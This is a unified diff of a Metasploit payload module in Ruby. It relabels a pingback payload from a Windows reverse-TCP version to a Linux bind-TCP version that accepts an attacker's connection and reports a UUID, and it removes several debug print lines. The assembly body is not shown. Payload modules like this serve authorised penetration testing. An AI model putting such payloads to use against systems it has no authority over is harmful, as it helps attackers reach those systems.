@@ -19,8 +19,8 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
+      'Name'          => 'Linux x64 Pingback, Bind TCP Inline',
+      'Description'   => 'Accept a connection from attacker and report UUID (Linux x64)',
       'Author'        => [ 'bwatters-r7' ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
@@ -38,18 +38,12 @@ module MetasploitModule
       pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
 
-      puts("Generating pingback single payload")
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       pingback_uuid ||= generate_pingback_uuid
-      puts("UUID in send_pingback: " + pingback_uuid.to_s.gsub("-", ""))
       uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
-      puts("UUID as db in send_pingback: " + uuid_as_db)
-      puts("uuid_as_db.length: " + uuid_as_db.split(",").length.to_s)
       seconds = 5.0
       sleep_seconds = seconds.to_i
       sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
-
-
 
       asm = %Q^
 
@@ -133,7 +127,6 @@ module MetasploitModule
 
       ^
       asm
-      puts("pingback_reverse_tcp asm = " +asm)
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
   end
